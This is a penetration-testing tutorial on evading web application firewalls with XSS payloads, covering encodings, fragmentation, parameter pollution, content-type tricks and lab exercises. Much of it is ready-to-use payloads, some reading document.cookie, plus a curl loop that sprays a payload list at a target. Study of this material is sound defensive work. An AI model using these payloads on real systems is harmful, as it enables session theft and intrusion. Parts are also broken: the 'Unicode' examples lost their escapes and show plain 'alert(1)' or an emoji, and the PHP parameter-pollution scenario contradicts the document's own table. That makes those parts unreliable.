# Advanced WAF Bypass Techniques for XSS

## Introduction and Objectives

Web Application Firewalls (WAFs) serve as a critical defense layer between clients and web applications, inspecting incoming HTTP traffic for patterns associated with known attack vectors. For Cross-Site Scripting (XSS), WAFs typically employ regular expression signatures, token-based analysis, and heuristic models to detect and block payloads containing JavaScript event handlers, script tags, and encoded executable content. However, WAFs are constrained by the need to minimize false positives -- they must allow legitimate traffic through while blocking attacks, creating an inherent tension that attackers can exploit.

WAF bypass is not a single technique but a systematic methodology that combines encoding, obfuscation, fragmentation, and protocol-level manipulation to evade detection rules while preserving the semantic meaning of the attack payload. Understanding WAF bypass is essential for penetration testers because it reveals the actual attack surface of an application after its perimeter defenses are deployed. An application that appears hardened behind a WAF may still be vulnerable when the WAF's rule set has gaps or when the application's rendering context creates unexpected exploitation paths.

**Learning Objectives:**

- Master multi-layer encoding chains (double URL, HTML entity, Unicode, base64)
- Construct fragmented and distributed XSS payloads that evade signature detection
- Exploit HTTP Parameter Pollution (HPP) for XSS bypass
- Bypass WAF rules in JSON, XML, and non-standard content-type contexts
- Manipulate content-type headers to bypass request body inspection
- Evade regex-based detection with whitespace alternatives and syntactic tricks
- Develop a systematic automated WAF testing methodology
- Understand WAF limitations and recommend defense-in-depth strategies

**Prerequisites:**

- Deep understanding of XSS variants (reflected, stored, DOM-based)
- Familiarity with HTML, JavaScript, and browser parsing behavior
- Experience with Burp Suite or similar proxy tools
- Knowledge of encoding schemes (URL, HTML entity, Unicode, base64)
- Access to a test environment with a WAF (ModSecurity, Cloudflare, AWS WAF, etc.)

## Encoding Chain Techniques

### Double URL Encoding

Many WAFs decode URL-encoded input once before applying their rule set. If the application decodes the input a second time (common in frameworks that normalize input), double URL encoding can bypass the WAF's single-pass inspection.

**Standard XSS payload:**

```html
<script>alert(1)</script>
```

**Single URL encoding (typically detected by WAF):**

```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

**Double URL encoding (may bypass):**

```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

The WAF sees `%253C` as a literal percent sign followed by `3C`, which does not match its `<` signature. The application's double-decode converts `%253C` to `%3C` and then to `<`.

**Double-encoded event handler:**

```
%253Cimg%2520src%253Dx%2520onerror%253D%2522alert(1)%2522%253E
```

**Double-encoded `javascript:` URI:**

```
%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%31%29
```

When double-encoded:

```
%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529
```

### HTML Entity Encoding

HTML entity encoding represents characters using named or numeric references. Browsers decode HTML entities in attribute values and text content before parsing JavaScript:

**Named entities:**

```html
<img src=x onerror="&#97;lert(1)">
<img src=x onerror="&Tab;alert(1)">
```

**Decimal numeric entities:**

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

**Hexadecimal numeric entities:**

```html
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

**Encoding the tag itself:**

```html
&#60;script&#62;alert(1)&#60;/script&#62;
<xmp><script>alert(1)</script></xmp>
```

Note: encoding the tag itself only works if the application renders the decoded HTML. Most WAFs detect `<script` regardless of internal entity encoding.

### Unicode Encoding

JavaScript supports Unicode escape sequences (`\uXXXX`) in strings and identifiers. While browsers do not decode `\uXXXX` in HTML tag attributes, this encoding works within JavaScript contexts:

```html
<script>
  var x = "alert(1)";
  eval(x);
</script>
```

Unicode in HTML context (using `&#x` notation):

```html
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
```

**Full Unicode bypass for `alert`:**

```javascript
alert(1)    // alert(1)
document.cookie  // document.cookie
```

**Unicode with surrogate pairs (for WAFs that strip basic Unicode):**

```javascript
eval("😀")  // May bypass WAFs checking for specific Unicode ranges
```

### Base64 Encoding

Base64 encoding combined with the `data:` URI scheme or `atob()` function can bypass WAFs that do not inspect base64-decoded content:

**Using data URI:**

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

Where the base64 decodes to `<script>alert(1)</script>`.

**Using atob():**

```html
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">
```

Where the base64 decodes to `alert(document.cookie)`.

**Using data URI with iframe:**

```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

**Using base64 in meta refresh:**

```html
<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### Mixed Encoding Chains

Combine multiple encoding layers to evade WAFs that handle individual encoding schemes:

```html
<!-- URL + HTML entity -->
%3Cimg%20src%3Dx%20onerror%3D%22%26%2397%3Blert(1)%22%3E

<!-- HTML entity + Unicode -->
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">

<!-- Base64 inside URL encoding -->
%3Cimg%20src%3Dx%20onerror%3D%22eval(atob(%27YWxlcnQoMSk%3D%27))%22%3E
```

## Payload Fragmentation

### String Concatenation

JavaScript allows string concatenation within expressions. WAFs that look for complete keywords like `document.cookie` can be bypassed:

```html
<img src=x onerror="alert(document['coo'+'kie'])">
<script>var a='docu';var b='ment.';var c='coo';var d='kie';eval(a+b+c+d)</script>
<img src=x onerror="window['al'+'ert'](window['doc'+'ument']['coo'+'kie'])">
```

### Splitting Keywords Across Parameters

If the application reflects multiple parameters into the same page, split the XSS payload across them:

```
https://target.com/page?param1=<script>var x='&param2=alert(1)//'
```

If `param1` and `param2` are both reflected into the page:

```html
<script>var x='<script>var x='';alert(1)//'
```

### JavaScript Template Literals

ES6 template literals use backticks and allow embedded expressions. Some WAFs do not inspect template literal syntax:

```html
<img src=x onerror="alert`1`">
<script>eval(`${'alert(1)'}`)</script>
<script>Function`${'alert(1)'}```</script>
```

### Array and Object Construction

Build strings from arrays or objects to avoid keyword detection:

```html
<script>
var s = ['a','l','e','r','t','(','1',')'].join('');
eval(s);
</script>

<img src=x onerror="[]['constructor']['constructor']('alert(1)')()">
```

### Bracket Notation

Use bracket notation instead of dot notation to access object properties, then encode the string keys:

```html
<script>
window["ale"+"rt"](1)
window["docu"+"ment"]["coo"+"kie"]
self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
</script>
```

## HTTP Parameter Pollution (HPP) for XSS

### Understanding HPP

HTTP Parameter Pollution exploits how different components (browser, WAF, application server, framework) handle multiple parameters with the same name. When a request contains `?a=1&a=2`, different components may take the first value, the last value, or concatenate them.

### HPP for WAF Bypass

If the WAF and the application server parse duplicate parameters differently, an attacker can split the XSS payload across two parameters:

```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

q=<script>alert(1)</script>&q=safe_search_term
```

**Scenario**: The WAF inspects only the last `q` parameter (`safe_search_term`) and passes the request. The application server (e.g., PHP) takes the first `q` parameter (`<script>alert(1)</script>`) and reflects it in the response.

**HPP with different framework behaviors:**

| Technology | Takes |
|-----------|-------|
| PHP | Last value (`$_GET['q']` = `safe_search_term`) |
| ASP.NET | All values concatenated |
| JSP | First value |
| Node.js (Express) | First value |
| Flask/Django | Last value |
| Ruby on Rails | Last value |

Craft HPP payloads based on the target technology stack:

```
# Target is JSP (takes first value)
?q=safe_search_term&q=<script>alert(1)</script>

# Target is PHP (takes last value)
?q=<script>alert(1)</script>&q=safe_search_term
```

### HPP in URL Path Segments

Some applications parse parameters from URL path segments:

```
/search;q=<script>alert(1)</script>;q=safe/page
```

If the WAF does not parse semicolon-delimited path parameters, the XSS payload may bypass detection.

## JSON and XML Context Bypass

### JSON Context XSS

When user input is reflected inside a JSON response, the WAF may apply different (or no) rules for JSON content. However, if the JSON is parsed and rendered by the client-side application, XSS is still possible.

**Input reflected in JSON string value:**

```json
{"message": "USER_INPUT_HERE", "type": "info"}
```

Escape the JSON string and inject HTML:

```
"},{"message":"<img src=x onerror=alert(1)>","type":"x
```

Resulting JSON:

```json
{"message": ""},{"message":"<img src=x onerror=alert(1)>","type":"x", "type": "info"}
```

If the application does not properly parse the resulting JSON, the HTML may be rendered.

**JSON with Unicode escape:**

```json
{"message": "<script>alert(1)</script>"}
```

Some WAFs do not decode JSON Unicode escapes before applying XSS rules.

**JSONP callback injection:**

```
https://target.com/api/jsonp?callback=<script>alert(1)</script>
```

If the WAF does not inspect callback parameter values for XSS:

```javascript
<script>alert(1)</script>({"data": "value"});
```

### XML Context XSS

When input is reflected in XML responses, exploit XML parsing and CDATA sections:

**XSS via XML injection:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<response>
  <message>USER_INPUT</message>
</response>
```

Inject:

```xml
</message><message><![CDATA[<script>alert(1)</script>]]></message><message>
```

**XSS via XSLT (if the XML is rendered via XSLT):**

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <script>alert(1)</script>
  </xsl:template>
</xsl:stylesheet>
```

**SVG-based XSS in XML context:**

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
</svg>
```

## Content-Type Manipulation

### Changing the Content-Type

WAFs often apply different rule sets based on the `Content-Type` header. If the WAF applies stricter XSS rules to `application/x-www-form-urlencoded` but looser rules to `text/plain` or `application/json`, changing the content-type can bypass detection:

```http
POST /api/comment HTTP/1.1
Host: target.com
Content-Type: text/plain

comment=<script>alert(1)</script>
```

If the WAF skips XSS inspection for `text/plain` but the application still processes the body as form data, the payload bypasses the WAF.

### Multipart Form Data Bypass

WAFs may not thoroughly inspect multipart form data payloads. Place the XSS payload in a file upload field or in a part with an unexpected content-type:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="comment"; filename="test.html"
Content-Type: text/html

<script>alert(1)</script>
------Boundary--
```

### Content-Type Charset Bypass

Some WAFs handle character encoding incorrectly. Specify an unusual charset to cause the WAF to misinterpret the payload:

```http
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded; charset=iso-8859-1

q=%00%3Cscript%3Ealert(1)%3C/script%3E
```

If the WAF assumes UTF-8 but the application processes ISO-8859-1, null bytes and encoding differences may cause the WAF to miss the payload.

## Regex Evasion Techniques

### Whitespace Alternatives

WAF regex patterns often look for specific whitespace sequences between keywords. Use alternative whitespace characters:

| Character | Name | Hex |
|-----------|------|-----|
| ` ` | Space | `%20` |
| `\t` | Tab | `%09` |
| `\n` | Newline | `%0A` |
| `\r` | Carriage Return | `%0D` |
| `\f` | Form Feed | `%0C` |
| `\v` | Vertical Tab | `%0B` |
| `\x00` | Null Byte | `%00` |

**Examples:**

```html
<img%09src=x%09onerror=alert(1)>
<img%0Asrc=x%0Aonerror=alert(1)>
<img%0Dsrc=x%0Donerror=alert(1)>
<img/./src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
```

### Tag Name Obfuscation

WAFs often use regex patterns like `<\s*script` to detect script tags. Bypass with:

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Null byte insertion -->
<scr%00ipt>alert(1)</script>

<!-- Nested tags -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Tag name with comments -->
<script<!--->>alert(1)</script<!--->>

<!-- Extra characters that browsers tolerate -->
<script/xss>alert(1)</script>
<script~xss>alert(1)</script~xss>
```

### Event Handler Alternatives

If the WAF blocks common event handlers like `onerror`, `onload`, and `onclick`, use less common handlers:

```html
<!-- Animation events -->
<svg onbegin="alert(1)">
<marquee onstart="alert(1)">

<!-- Focus events -->
<input onfocus="alert(1)" autofocus>
<select onfocus="alert(1)" autofocus>
<textarea onfocus="alert(1)" autofocus>

<!-- Mouse events -->
<body onmouseover="alert(1)">
<div onmouseenter="alert(1)">

<!-- Keyboard events -->
<input onkeydown="alert(1)">
<body onkeypress="alert(1)">

<!-- Media events -->
<video onerror="alert(1)"><source src=x>
<audio oncanplay="alert(1)"><source src="valid.mp3">

<!-- Drag events -->
<div draggable="true" ondrag="alert(1)">drag me</div>

<!-- Clipboard events -->
<input onpaste="alert(1)" id=x autofocus>
```

### JavaScript Keyword Obfuscation

Bypass WAFs that detect `alert`, `document`, `cookie`, and other keywords:

```javascript
// Window reference alternatives
window['al'+'ert'](1)
self['al'+'ert'](1)
top['al'+'ert'](1)
parent['al'+'ert'](1)
frames['al'+'ert'](1)
globalThis['al'+'ert'](1)

// Function constructor
Function('al'+'ert(1)')()
[].constructor.constructor('al'+'ert(1)')()

// setTimeout/setInterval
setTimeout('al'+'ert(1)', 0)
setInterval('al'+'ert(1)', 1)

// throw/try
try{throw 1}catch(e){alert(e)}

// Proxy
new Proxy(alert, {apply: function(t,_,a){t(a[0])}})(1)

// eval with encoding
eval(atob('YWxlcnQoMSk='))
eval('\x61\x6c\x65\x72\x74(1)')
eval('\141\154\145\162\164(1)')  // octal
```

## Automated WAF Testing Methodology

### Step 1: WAF Fingerprinting

Identify the WAF product before crafting bypass payloads:

```bash
# Check response headers
curl -I https://target.com

# Send a deliberately malicious request and observe the response
curl -v "https://target.com/search?q=<script>alert(1)</script>"

# Common WAF identifiers:
# - Server header: cloudflare, awselb/2.0, AkamaiGHost
# - Custom headers: X-WAF-EventInfo, X-CDN, X-Sucuri-ID
# - Response status: 403, 419, 501, 999
# - Response body: "Access Denied", "Request Rejected", WAF brand name
```

WAF fingerprinting tools:

```bash
# wafw00f
wafw00f https://target.com

# nmap WAF detection
nmap --script http-waf-detect -p 443 target.com

# IdentYwaf
python3 identYwaf.py https://target.com
```

### Step 2: Baseline Testing

Send normal, non-malicious requests to establish the WAF's baseline behavior:

```bash
# Normal request
curl "https://target.com/search?q=hello"

# Harmless HTML
curl "https://target.com/search?q=<b>hello</b>"

# Partial XSS keyword
curl "https://target.com/search?q=alert"
curl "https://target.com/search?q=script"
```

Identify which individual components trigger the WAF and which pass through.

### Step 3: Systematic Bypass Testing

Test each bypass technique systematically:

```bash
# Create a payload list
cat > xss_payloads.txt << 'EOF'
<script>alert(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<script%09>alert(1)</script>
<script%0a>alert(1)</script>
<img src=x onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror="&#97;lert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<svg onload=alert(1)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
EOF

# Test each payload
while read payload; do
  echo "Testing: $payload"
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  echo "Response: $response"
done < xss_payloads.txt
```

### Step 4: Burp Suite Automated Testing

Use Burp Suite's Intruder for systematic WAF bypass testing:

1. Capture a request with the XSS parameter in Burp Proxy
2. Send to Intruder (Ctrl+I)
3. Mark the payload position on the XSS parameter value
4. Load a comprehensive XSS bypass payload list
5. Configure Intruder to highlight different response codes
6. Analyze results: responses with status 200 (not blocked) indicate successful bypass

Use Burp extensions for enhanced WAF testing:

- **WAF Bypass**: Automated bypass payload generation
- **Turbo Intruder**: High-speed race condition and bypass testing
- **Param Miner**: Hidden parameter discovery that may reveal unprotected endpoints

### Step 5: Confirm Exploitation

For each payload that bypasses the WAF, verify that the XSS actually executes:

1. Open the URL with the bypass payload in a browser
2. Check the browser's developer tools console for JavaScript execution
3. Verify that the payload is reflected in the response without sanitization
4. Document the complete bypass payload and the conditions required

## Hands-On Practice and Exercises

### Exercise 1: Encoding Chain Bypass

**Objective**: Bypass a WAF using multi-layer encoding.

**Setup**: Configure ModSecurity with the OWASP Core Rule Set on a vulnerable application.

**Steps**:
1. Confirm the WAF blocks a basic `<script>alert(1)</script>` payload
2. Test single URL encoding -- observe it is still blocked
3. Test double URL encoding -- observe if it bypasses
4. Test HTML entity encoding of the `alert` keyword
5. Test a combination of URL encoding + HTML entity encoding
6. Test base64 encoding with the `atob()` function
7. Document which encoding chains successfully bypass the WAF

**Expected Result**: At least one encoding chain bypasses the WAF and executes JavaScript.

### Exercise 2: Fragmentation and Obfuscation

**Objective**: Bypass keyword-based WAF rules using payload fragmentation.

**Setup**: Same environment as Exercise 1.

**Steps**:
1. Confirm the WAF blocks payloads containing `alert` and `document.cookie`
2. Test string concatenation: `window['al'+'ert'](1)`
3. Test hex encoding: `\x61\x6c\x65\x72\x74(1)`
4. Test Unicode encoding: `alert(1)`
5. Test the Function constructor: `Function('al'+'ert(1)')()`
6. Test template literals: `alert\`1\``
7. Build a payload that combines fragmentation with encoding

**Expected Result**: Successfully execute JavaScript while avoiding all keyword-based WAF rules.

### Exercise 3: HPP and Context-Based Bypass

**Objective**: Exploit parameter parsing differences and content-type handling.

**Setup**: Deploy a multi-parameter application behind a WAF.

**Steps**:
1. Identify all parameters that are reflected in the response
2. Test HPP by splitting an XSS payload across two parameters with the same name
3. Change the Content-Type header from `application/x-www-form-urlencoded` to `text/plain`
4. Test JSON context injection if the application accepts JSON input
5. Test multipart form data with XSS in file content
6. Document which technique bypasses the WAF

**Expected Result**: Successful WAF bypass through parameter parsing or content-type manipulation.

### Exercise 4: Full WAF Bypass Assessment

**Objective**: Conduct a comprehensive WAF bypass assessment against a real WAF.

**Setup**: Configure Cloudflare, AWS WAF, or a similar commercial WAF in front of a test application.

**Steps**:
1. Fingerprint the WAF product and version
2. Establish baseline behavior with benign requests
3. Systematically test all bypass techniques from this guide
4. For each successful bypass, document:
   - The complete payload
   - The WAF rule that was bypassed
   - The encoding or obfuscation technique used
5. Compile a WAF bypass report with recommended WAF rule improvements

**Expected Result**: A comprehensive report documenting the WAF's bypass surface with specific payload examples.

### Exercise 5: Automated WAF Testing Pipeline

**Objective**: Build an automated pipeline for WAF bypass testing.

**Setup**: Create a script that systematically tests XSS payloads against a WAF-protected endpoint.

**Steps**:
1. Create a comprehensive XSS payload list with bypass techniques
2. Write a Python script that tests each payload and records the response
3. Implement automatic detection of successful bypasses (status code 200 + payload in response)
4. Add encoding mutation (automatically generate encoding variants)
5. Generate a report with successful bypass payloads
6. Test the pipeline against at least two different WAFs

**Expected Result**: A reusable automated WAF testing tool with results for multiple WAFs.

## References and Resources

### Standards and Documentation

- **OWASP ModSecurity Core Rule Set**: https://owasp.org/www-project-modsecurity-core-rule-set/
- **OWASP XSS Filter Evasion Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- **HTML5 Security Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- **Browser HTML Parsing Specification**: https://html.spec.whatwg.org/multipage/parsing.html

### Tools

- **Burp Suite Professional**: Intruder for automated bypass testing (https://portswigger.net/burp)
- **wafw00f**: WAF fingerprinting tool (https://github.com/EnableSecurity/wafw00f)
- **identYwaf**: WAF identification tool (https://github.com/stampery/identYwaf)
- **XSStrike**: Advanced XSS detection and WAF bypass (https://github.com/s0md3v/XSStrike)
- **PolyglotPWN**: XSS polyglot payload generator (https://github.com/)
- **PayloadBox**: XSS payload collections (https://github.com/payloadbox)

### WAF-Specific Bypass Resources

- **Cloudflare WAF Bypass Techniques**: https://blog.cloudflare.com/
- **AWS WAF Bypass Research**: Various security blog posts on AWS WAF limitations
- **ModSecurity Rule Bypass**: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/
- **Akamai Kona Site Defender Bypass**: Security research publications
- **Imperva SecureSphere Bypass**: Publicly disclosed bypass techniques

### Practice Labs

- **PortSwigger Web Security Academy - XSS**: https://portswigger.net/web-security/cross-site-scripting
- **OWASP Vulnerable Web Applications Directory**: https://owasp.org/www-project-vulnerable-web-applications-directory/
- **TryHackMe - XSS and WAF Rooms**: https://tryhackme.com/
- **HackTheBox - Web Challenges**: XSS-focused challenges with WAF bypass requirements

### Books and Research Papers

- **"Web Application Hacker's Handbook"** by Stuttard and Pinto - XSS and WAF bypass chapters
- **"Browser Hacker's Handbook"** by Wade Alcorn et al. - Browser parsing and XSS delivery
- **"WAF Bypass Techniques"** - Various Black Hat and DEF CON presentations
- **HTML5 Attack Vectors**: Research on new XSS vectors in HTML5 APIs
- **XSS Cheat Sheet by PortSwigger**: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

### Additional Reading

- **Browser Security Whitepapers**: Chrome, Firefox, and Safari security blog posts on XSS prevention
- **WAF Evaluation Reports**: Independent WAF effectiveness testing results
- **HackerOne Hacktivity**: XSS bypass reports with detailed WAF evasion techniques
- **PayloadsAllTheThings - XSS WAF Bypass**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks - XSS WAF Bypass**: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
